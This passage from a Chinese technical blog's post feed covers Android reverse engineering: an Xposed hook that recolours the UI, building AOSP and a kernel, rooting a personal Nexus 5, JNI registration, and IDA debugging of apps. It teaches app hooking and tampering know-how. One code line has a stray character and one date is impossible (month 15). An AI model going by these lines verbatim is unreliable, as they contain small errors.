的，并且是开源的。 新建基础项目 导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中） 修改 AndroidManifest.xml 文件 入口类编写 设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain 安装激活插件，重启后可以看到插件效果 修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly： 12345...dependencies &#123; ... compileOnly files('lib/XposedBridgeApi-54.jar')&#125; Hook Java修改 AndroidManifest.xml 文件： 123456789&lt;manifest&gt; &lt;application&gt; ... &lt;meta-data android:name=\"xposedmodule\" android:value=\"true\"/&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"Hook getColor\"/&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"54\"/&gt; &lt;/application&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\"&gt;&lt;/uses-permission&gt;&lt;/manifest&gt; 入口类编写，新建一个类文件： 12345678910111213141516171819202122232425262728public class XposedMain implements IXposedHookLoadPackage &#123; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws Throwable &#123;// if (param.packageName.equals(\"apk\")) &#123; try &#123; findAndHookMethod(\"android.content.res.Resources\", param.classLoader, \"getColor\", int.class, new myGetColor());// waitForDebugger(); &#125; catch (Exception e) &#123; XposedBridge.log(e); &#125;// &#125; &#125;&#125;class myGetColor extends XC_MethodHook &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; Log.d(\"DEBUG\", \"Before Method Hook\"); &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; Log.d(\"DEBUG\", \"After Method Hook\"); int res = (int) param.getResult();s res = res &amp; ~0xFFFFFF | 0x00AAAA; param.setResult(res); &#125;&#125; 同样，编写完成后会弹出一个 Xposed module is not activated： 点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件： 重启后系统部分颜色同样被改变，但效果没有 Cydia 的好： classLoader与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。 Android 源码浅析EnvironmentUbuntu 14.04 编译首先搭建好 JDK 6 的环境： 1234567891011cd &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.binchmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bincd /usr &amp;&amp; sudo mkdir javacd java &amp;&amp; sudo mv ~/jdk1.6.0_45 .vim ~/.bashrc# export JAVA_HOME=\"/usr/java/jdk1.6.0_45\"# export JRE_HOME=\"$JAVA_HOME/jre\"# export CLASSPATH=\"$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\"# export PATH=\"$PATH:$JAVA_HOME/bin\"source ~/.bashrcjava -version 然后安装一些编译时需要用到的依赖文件： 12sudo apt-get updatesudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip 添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别： 123cd &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rulessudo mv 51-android.rules /etc/udev/rules.d/sudo udevadm control --reload-rules 接下来使用 repo 工具同步下载 Android 源码： 1234567891011121314cd &amp;&amp; mkdir bin # export PATH=\"$HOME/bin:$PATH\"curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo# curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repoexport WORKING_DIRECTORY=\"android-4.4.3_r1\"mkdir $WORKING_DIRECTORY &amp;&amp; cd $WORKING_DIRECTORYgit config --global user.name \"Your Name\"git config --global user.email \"your@example.com\"# export REPO_URL=\"https://aosp.tuna.tsinghua.edu.cn/android/git-repo\"# vim ~/bin/repo # REPO_URL = 'https://aosp.tuna.tsinghua.edu.cn/android/git-repo'repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1# repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1repo sync # Takes a very long time# repo sync -c --no-clone-bundle --no-tags --prune -j4 同步完成后进行编译： 123456source build/envsetup.sh # Setup environmentlunch aosp_arm-eng # Setup choicesexport USE_CCACHE=1 # Enable ccacheprebuilts/misc/linux-x86/ccache/ccache -M 100G # Set ccache memory = 100G# export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccachemake -j4 目录结构安装一下 Android Studio，用来作为查看源码的编辑器： 1234567sudo apt-get updatesudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gztar zxvf android-studio-ide-191.6010548-linux.tar.gzsudo mv android-studio /usr/localcd /usr/local/android-studio/bin./studio.sh PS：谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。 生成 Android Studio 文件： 1234cd $HOME/$WORKING_DIRECTORY &amp;&amp; source build/envsetup.shlunch aosp_arm-engcd development/tools/idegen &amp;&amp; mmcd $HOME/$WORKING_DIRECTORY &amp;&amp; ./development/tools/idegen/idegen.sh 运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构： 文件夹/文件 包含内容 abi art art 模式相关的代码 bionic 各种 so 库的源代码 bootable recovery、bootloader、diskinstaller build 源码编译生成的规则代码 cts Android 兼容性测试套件标准 dalvik Dalvik 模式相关的代码 developers 一些开发上用来参考的资料 development Android 开发相关的代码，makekey 等 device 手机驱动的源码 docs doc 文档 external Android 使用的一些开源的模块 frameworks 框架 hardware 部分开源的 HAL 代码 libcore 一些核心的 lib 文件库 libnativehelper jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数 Makefile ndk ndk 代码 out packages 应用程序源码 pdk prebuilts 镜像生成依赖的一些文件，如 gcc、kernel 等 sdk sdk 源码，模拟器源码 system 底层文件系统库、应用及组件（C 语言） tools 内核代码编译内核代码 123456789101112git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm# git clone https://android.googlesource.com/kernel/msmcd msmgit branch -agit checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1sudo -i # 在root下进行编译export PATH=\"$PATH:$WORKING_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin\"export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead_defconfigmake -j4 完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像： 123source build/envsetup.shlunch aosp_hammerhead-userdebugmake -j4 刷机： 12adb reboot bootloaderfastboot -w flashall 编译命令 作用 m 编译所有的模块 mm 编译当前目录下的模块，当前目录下要有 Android.mk 文件 mmm 编译指定路径下的模块，指定路径下要有 Android.mk 文件 make snod 部分编译完后，使用该命令来编译的结果整合到镜像中 使用 Docker 进行编译 Android 源码源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下： 1234cd &amp;&amp; mkdir buildexport AOSP_VOL=\"$HOME/build\"wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh # 连接不上的话改一下hostsbash build-kitkat.sh Referenceshttps://www.bilibili.com/video/av45424886https://source.android.com/setup?hl=enhttps://jingyan.baidu.com/article/d621e8dae805272865913fa7.htmlhttps://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.htmlhttps://blog.csdn.net/u012417380/article/details/72809141https://blog.csdn.net/u012417380/article/details/73196722https://blog.csdn.net/u012417380/article/details/73353670https://blog.csdn.net/sergeycao/article/details/46459419https://www.jianshu.com/p/3bdf6e9f9dfehttp://shxi.me/posts/7b82cd68.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"2020春节-吾爱破解解题领红包活动","slug":"2020春节-吾爱破解解题领红包活动","date":"2020-02-11T03:37:58.000Z","updated":"2020-02-25T11:46:30.259Z","comments":true,"path":"2020/02/11/2020春节-吾爱破解解题领红包活动/","link":"","permalink":"qianfei11.coding.me/2020/02/11/2020春节-吾爱破解解题领红包活动/","excerpt":"Continue Reading...","text":"Enter Password and Continue Reading... ","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"Nexus5刷机、Root并安装Xposed框架","slug":"Nexus5刷机、Root并安装Xposed框架","date":"2020-02-05T06:59:47.000Z","updated":"2020-02-06T02:16:55.913Z","comments":true,"path":"2020/02/05/Nexus5刷机、Root并安装Xposed框架/","link":"","permalink":"qianfei11.coding.me/2020/02/05/Nexus5刷机、Root并安装Xposed框架/","excerpt":"在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。","text":"在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。 解锁先使用 adb 命令进入 bootloader 模式： 1$ adb reboot bootloader 这部机子一开始已经解锁了，所以会报错： 123$ fastboot oem unlock FAILED (remote: 'Already Unlocked')fastboot: error: Command failed 刷机刷机一般是采用官方的镜像，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 flash-all.sh： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576$ adb reboot bootloader$ fastboot devices0b83c85e00ce15f9 fastboot$ ./flash-all.shSending 'bootloader' (2508 KB) OKAY [ 0.290s]Writing 'bootloader' OKAY [ 0.497s]Finished. Total time: 0.981sRebooting into bootloader OKAY [ 0.094s]Finished. Total time: 0.094sSending 'radio' (45409 KB) OKAY [ 1.640s]Writing 'radio' OKAY [ 3.105s]Finished. Total time: 4.975sRebooting into bootloader OKAY [ 0.106s]Finished. Total time: 0.106s--------------------------------------------Bootloader Version...: HHZ11kBaseband Version.....: M8974A-2.0.50.1.13Serial Number........: 0b83c85e00ce15f9--------------------------------------------extracting android-info.txt (0 MB) to RAM...Checking 'product' OKAY [ 0.097s]Checking 'version-bootloader' OKAY [ 0.100s]Checking 'version-baseband' OKAY [ 0.100s]extracting boot.img (8 MB) to disk... took 0.038sarchive does not contain 'boot.sig'Sending 'boot' (8700 KB) OKAY [ 0.490s]Writing 'boot' OKAY [ 0.749s]archive does not contain 'dtbo.img'archive does not contain 'dt.img'extracting recovery.img (9 MB) to disk... took 0.039sarchive does not contain 'recovery.sig'Sending 'recovery' (9284 KB) OKAY [ 0.510s]Writing 'recovery' OKAY [ 0.776s]archive does not contain 'vbmeta.img'archive does not contain 'vbmeta_system.img'archive does not contain 'super_empty.img'archive does not contain 'odm.img'archive does not contain 'product.img'extracting system.img (704 MB) to disk... took 3.704sarchive does not contain 'system.sig'Sending 'system' (721400 KB) OKAY [ 22.834s]Writing 'system' OKAY [ 49.509s]archive does not contain 'system_ext.img'archive does not contain 'vendor.img'Erasing 'userdata' OKAY [ 15.664s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 7137786 4k blocks and 1785856 inodesFilesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: doneSending 'userdata' (4416 KB) OKAY [ 0.244s]Writing 'userdata' OKAY [ 0.495s]Erasing 'cache' OKAY [ 0.600s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 179200 4k blocks and 44832 inodesFilesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275dSuperblock backups stored on blocks: 32768, 98304, 163840Allocating group tables: doneWriting inode tables: doneCreating journal (4096 blocks): doneWriting superblocks and filesystem accounting information: doneSending 'cache' (428 KB) OKAY [ 0.211s]Writing 'cache' OKAY [ 0.219s]Rebooting OKAY [ 0.100s]Finished. Total time: 100.120s 完成后，如果没有什么故障，稍过片刻就能打开新的系统了。 我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 /data 和 /cache 进行格式化，照着这篇文章对系统进行双清后，容量恢复到了正常状态。 Root刷完机后，可以进行 root 了。下载 Android Root 包 CF-Auto-Root-hammerhead-hammerhead-nexus5.zip 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错： 12$ tools/fastboot-mac --versionfastboot version 09a0d98bebce-android 本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot： 123$ fastboot --versionfastboot version 29.0.2-5738569Installed as /usr/local/bin/fastboot 然后进入 bootloader，并执行 root-mac.sh： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263$ adb reboot bootloader$ ./root-mac.sh----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.----- ----- ----- ----- ----- ----- -----Please make sure your device is in bootloader/fastboot mode before continuing.----- ----- ----- ----- ----- ----- -----***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your devicewas not previously unlocked, this will wipe all your data !Please watch the screen on your device, user input may be required.You may need to enter your administrator password to continue.Press Ctrl+C to cancel !Press ENTER to continuePassword:----- ----- ----- ----- ----- ----- -----If you just unlocked for the first time, it is advised to boot the device intoAndroid before continuing. This first boot may take several minutes, sometimeseven half an hour.If you decide to boot back into Android first, return your device tobootloader/fastboot mode before continuing again.Press Ctrl+C to cancel !Press ENTER to continue----- ----- ----- ----- ----- ----- -----We will now attempt to boot CF-Auto-Root. You should see a red Android on thescreen of your device in a minute, with scrolling white text on top of it.Sending &apos;boot.img&apos; (15868 KB) OKAY [ 0.605s]Booting OKAY [ 0.121s]Finished. Total time: 0.747sIf nothing happens even after several minutes, something may be wrong.Once CF-Auto-Root is done, it will reboot your device. Keep in mind that yourdevice may reboot a number of times, and it may be a few minutes before youare back into Android. It is important that you do not interrupt this process,unless it takes more than five minutes in total.Press ENTER to continue 成功后，手机会出现一个红色的安卓标志： 打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root： 12345$ adb shellshell@hammerhead:/ $ suroot@hammerhead:/ # iduid=0(root) gid=0(root) context=u:r:init:s0root@hammerhead:/ # TWRP下载 twrp-3.3.1-0-hammerhead.img，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启： 123456789$ adb reboot bootloader$ fastboot flash recovery twrp-3.3.1-0-hammerhead.imgSending &apos;recovery&apos; (13290 KB) OKAY [ 0.630s]Writing &apos;recovery&apos; OKAY [ 1.040s]Finished. Total time: 1.863s$ fastboot rebootRebooting OKAY [ 0.001s]Finished. Total time: 0.001s XposedAndroid 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 Xposed Installer 来安装 Xposed 框架： 12345$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apkPerforming Push Installapks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s) pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apkSuccess Referenceshttps://www.bodkin.ren/index.php/archives/513/https://jilu.wiki/d/177https://blog.csdn.net/feiniao8651/article/details/70083246/https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193https://sspai.com/post/24538","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"Android逆向入门（二）","slug":"Android逆向入门（二）","date":"2020-01-31T08:10:49.000Z","updated":"2020-02-12T14:28:59.450Z","comments":true,"path":"2020/01/31/Android逆向入门（二）/","link":"","permalink":"qianfei11.coding.me/2020/01/31/Android逆向入门（二）/","excerpt":"Android JNI 编程及 ARM 汇编入门。","text":"Android JNI 编程及 ARM 汇编入门。 EnvironmentAndroid Studio 3.5.3 JNIAndroid 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。 如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 log.h 定义几个在 C++ 文件中进行日志输出的函数： 12345678910#include &lt;android/log.h&gt;#ifndef LOG_TAG#define LOG_TAG \"MY_TAG\"#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endif 在 Java 文件中添加日志输出： 12345678910public class MainActivity extends AppCompatActivity &#123; ... @Override protected void onCreate(Bundle savedInstanceState) &#123; ... Log.d(\"Debug\", \"infomation\"); &#125; ...&#125; 在需要调用 JNI 的函数中加载动态库： 12345678public class MainActivity extends AppCompatActivity &#123; // Used to load the 'native-lib' library on application startup. static &#123; System.loadLibrary(\"native-lib\"); &#125; ...&#125; Native 函数注册静态注册静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。 Java 文件中的 Native 声明： 1public native String sayHello(); 静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 JNIEnv* env 和 jclass（static 方法时）/jobject（普通方法时）： 12345678910#include &lt;jni.h&gt;#include &lt;string&gt;#include \"log.h\"extern \"C\" &#123;JNIEXPORT jstring JNICALLJava_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) &#123; return env-&gt;NewStringUTF(\"Hello World\");&#125;&#125; 静态注册有一些缺点： Native 函数名称特别长，不利于书写； 每次新增或删除接口时需要重新生成文件，比较繁琐； 第一次调用时需要根据函数名建立索引，影响效率； JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。 动态注册动态注册在 JNI 层通过重载 JNI_OnLoad() 函数来实现，系统初始化 JNI 在加载时，会调用 JNI_OnLoad()，而卸载时会调用 JNI_UnLoad()。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。 cpp 文件中的函数定义如下： 123jstring sayHi(JNIEnv *env, jobject obj) &#123; return env-&gt;NewStringUTF(\"Hi World\");&#125; 通过内置函数 RegisterNatives() 实现自定义的注册方法： 1234567891011static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) &#123; jclass clazz; clazz = env-&gt;FindClass(className); if (clazz == NULL) &#123; return JNI_FALSE; &#125; if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123; return JNI_FALSE; &#125; return JNI_TRUE;&#125; 定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息： 1234static const char *gClassName = \"com/assassinq/easycpp/MainActivity\";static JNINativeMethod gMethods[] = &#123; &#123;\"sayHi\", \"()Ljava/lang/String;\", (void *) sayHi&#125;,&#125;; 其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针： 12345typedef struct &#123; const char* name; // native 的方法名 const char* signature; // 方法签名，例如 ()Ljava/lang/String; void* fnPtr; // 函数指针&#125; JNINativeMethod; 最后重写 JNI_OnLoad() 函数： 12345678910111213JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = NULL; if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGE(\"This jni version is not supported\"); return -1; &#125; if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) &#123; LOGE(\"Unable to register native methods\"); return -1; &#125; LOGE(\"Methods loaded successfully\"); return JNI_VERSION_1_6;&#125; so 动态链接库在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库： 12345678910android &#123; ... defaultConfig &#123; ... ndk &#123; abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot; &#125; &#125; ...&#125; so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）： armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。 arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。 armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。 x86：Intel x86（平板、模拟器用得比较多）。 x86_64：Intel x64（64 位的平板）。 … IDA 反编译 so 文件用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so： 查看静态注册函数的反编译结果： 1234int __fastcall Java_com_assassinq_easycpp_MainActivity_sayHello(_JNIEnv *a1)&#123; return _JNIEnv::NewStringUTF(a1, \"Hello World\");&#125; 查看动态注册的函数的反编译结果： 1234int __fastcall sayHi(_JNIEnv *a1)&#123; return _JNIEnv::NewStringUTF(a1, \"Hi World\");&#125; IDA 动态调试 apk 安装 apk 到手机：adb install example.apk 将 IDA 目录下的调试文件 push 到手机上：adb push android_server /data/local/tmp 赋给程序可执行权限：chmod 777 android_server 启动调试服务端：./android_server （自定义设置端口方式：-p23333） 手机端端口转发至电脑端：adb forward tcp:[pc_port] tcp:[mobile_port] IDA 调试端口设置：Debugger-&gt;Process option 启动程序：adb shell am start -D -n packageName/activityName IDA 挂接到 Native 层：Debugger-&gt;Attach to process… 打开 monitor，监听并挂接到 JAVA 层：jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 android:debuggable=&quot;true&quot;（若没有则修改后并重新打包）。 动态链接库文件（.so 文件）加载顺序： 1init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array so 文件查看工具readelf 参数 功能 -a 显示 so 文件的所有信息 -h 显示 ELF 文件头 -l 显示 Program Headers，动态加载时需要的信息 -S 显示 Section Headers，静态加载分析时需要的信息 -e 显示 ELF Header、Section Headers、Program Headers 信息 -s 显示符号表（Symbol Table） -d 显示动态节区（Dynamic Section） 显示 ELF 文件头： 123456789101112131415161718192021$ readelf -h libnative-lib.soELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: ARM Version: 0x1 Entry point address: 0x0 Start of program headers: 52 (bytes into file) Start of section headers: 12932 (bytes into file) Flags: 0x5000200, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 40 (bytes) Number of section headers: 27 Section header string table index: 26 显示 Program headers： 123456789101112131415161718192021222324252627$ readelf -l libnative-lib.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00100 0x00100 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000 LOAD 0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW 0x1000 DYNAMIC 0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW 0x4 NOTE 0x000134 0x00000134 0x00000134 0x000bc 0x000bc R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 EXIDX 0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R 0x4 GNU_RELRO 0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW 0x4 Section to Segment mapping: Segment Sections... 00 01 .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata 02 .fini_array .data.rel.ro .dynamic .got .data .bss 03 .dynamic 04 .note.android.ident .note.gnu.build-id 05 06 .ARM.exidx 07 .fini_array .data.rel.ro .dynamic .got 显示 Section headers： 123456789101112131415161718192021222324252627282930313233343536$ readelf -S libnative-lib.soThere are 27 section headers, starting at offset 0x3284:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .note.android.ide NOTE 00000134 000134 000098 00 A 0 0 4 [ 2] .note.gnu.build-i NOTE 000001cc 0001cc 000024 00 A 0 0 4 [ 3] .dynsym DYNSYM 000001f0 0001f0 000190 10 A 4 1 4 [ 4] .dynstr STRTAB 00000380 000380 0001d3 00 A 0 0 1 [ 5] .gnu.hash GNU_HASH 00000554 000554 00004c 04 A 3 0 4 [ 6] .hash HASH 000005a0 0005a0 0000b0 04 A 3 0 4 [ 7] .gnu.version VERSYM 00000650 000650 000032 02 A 3 0 2 [ 8] .gnu.version_d VERDEF 00000684 000684 00001c 00 A 4 1 4 [ 9] .gnu.version_r VERNEED 000006a0 0006a0 000040 00 A 4 2 4 [10] .rel.dyn REL 000006e0 0006e0 0000e8 08 A 3 0 4 [11] .rel.plt REL 000007c8 0007c8 000088 08 AI 3 20 4 [12] .plt PROGBITS 00000850 000850 0000e0 00 AX 0 0 4 [13] .text PROGBITS 00000930 000930 0018c4 00 AX 0 0 4 [14] .ARM.exidx ARM_EXIDX 000021f4 0021f4 0001b8 08 AL 13 0 4 [15] .ARM.extab PROGBITS 000023ac 0023ac 0001a4 00 A 0 0 4 [16] .rodata PROGBITS 00002550 002550 000566 01 AMS 0 0 1 [17] .fini_array FINI_ARRAY 00003e3c 002e3c 000008 04 WA 0 0 4 [18] .data.rel.ro PROGBITS 00003e44 002e44 000048 00 WA 0 0 4 [19] .dynamic DYNAMIC 00003e8c 002e8c 000110 08 WA 4 0 4 [20] .got PROGBITS 00003f9c 002f9c 000064 00 WA 0 0 4 [21] .data PROGBITS 00004000 003000 000018 00 WA 0 0 4 [22] .bss NOBITS 00004018 003018 000001 00 WA 0 0 1 [23] .comment PROGBITS 00000000 003018 000109 01 MS 0 0 1 [24] .note.gnu.gold-ve NOTE 00000000 003124 00001c 00 0 0 4 [25] .ARM.attributes ARM_ATTRIBUTES 00000000 003140 000034 00 0 0 1 [26] .shstrtab STRTAB 00000000 003174 00010f 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 显示符号表： 1234567891011121314151617181920212223242526272829$ readelf -s libnative-lib.soSymbol table '.dynsym' contains 25 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND __cxa_atexit@LIBC (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND __cxa_finalize@LIBC (2) 3: 00000000 0 OBJECT GLOBAL DEFAULT UND __stack_chk_guard@LIBC (2) 4: 00000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@LIBC (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND __android_log_print 6: 00000000 0 OBJECT GLOBAL DEFAULT UND __sF@LIBC (2) 7: 00000000 0 FUNC GLOBAL DEFAULT UND abort@LIBC (2) 8: 00000000 0 FUNC GLOBAL DEFAULT UND fflush@LIBC (2) 9: 00000000 0 FUNC GLOBAL DEFAULT UND 